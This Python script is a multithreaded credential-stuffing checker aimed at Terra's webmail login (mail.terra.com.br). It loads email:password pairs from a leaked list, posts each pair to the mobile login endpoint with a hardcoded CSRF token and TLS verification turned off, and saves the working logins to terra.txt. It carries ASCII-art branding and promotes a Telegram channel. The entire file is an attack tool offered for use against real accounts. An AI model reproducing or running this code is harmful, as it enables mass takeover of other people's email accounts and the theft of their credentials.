import requests
import threading
from queue import Queue
import time
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login_terra(email, senha):
    headers = {
        'Host': 'mail.terra.com.br',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Sec-Fetch-Dest': 'empty',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://mail.terra.com.br',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'X-Requested-With': 'XMLHttpRequest',
        'referer': 'https://mail.terra.com.br/mobile/index.php?r=site/login'
    }

    data = {
        'LoginForm[username]': email,
        'LoginForm[password]': senha,
        'YII_CSRF_TOKEN': '9b3ecc1c0e1dd97d579e11d36221db9953ea1c1f'
    }

    response = requests.post('https://mail.terra.com.br/mobile/index.php?r=site/wslogin&logincapa',
                             headers=headers, data=data, verify=False)

    if '"valid":true' in response.text:
        print(f"\033[92mLIVE\033[97m | {email}:{senha} [ @duckettstone ]")
        with open("terra.txt", "a") as f:
            f.write(f"{email}:{senha}\n")
    else:
        print(f"\033[91mDIE\033[97m | {email}:{senha} | [ @duckettstone ]")

def worker(q):
    while True:
        email, senha = q.get()
        login_terra(email, senha)
        time.sleep(5)
        q.task_done()

def save_result(status, email, senha):
    with open(f"{status}_terra.txt", "a") as f:
        f.write(f"{email}:{senha}\n")

def get_list_filename():
    while True:
        listname = input("\n[+] Digite nome da sua lista (ex: lista.txt): ")
        if os.path.exists(listname):
            return listname
        else:
            print(f"O arquivo {listname} não foi encontrado. Tente novamente.")

def main():
    ascii_art = """
\033[31m
 (                        )  
 )\ )            (     ( /(  
(()/(      (     )\    )\()) 
 /(_))     )\  (((_) |((_)\  
(_))_   _ ((_) )\___ |_ ((_) 
 |   \ | | | |((/ __|| |/ /  
 | |) || |_| | | (__   ' <   
 |___/  \___/   \___| _|\_\  

"""

    print(ascii_art)
    print("\033[33mVisite nosso canal t.me/duckettstoneprincipal\033[0m")

    q = Queue()

    listname = get_list_filename()
    with open(listname, "r") as f:
        accounts = [line.strip().split(":", 1) for line in f if ":" in line]

    num_threads = 30

    print("\n[0] Checker iniciado aguarde...")

    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    for email, senha in accounts:
        q.put((email.strip(), senha.strip()))

    q.join()

if __name__ == "__main__":
    main()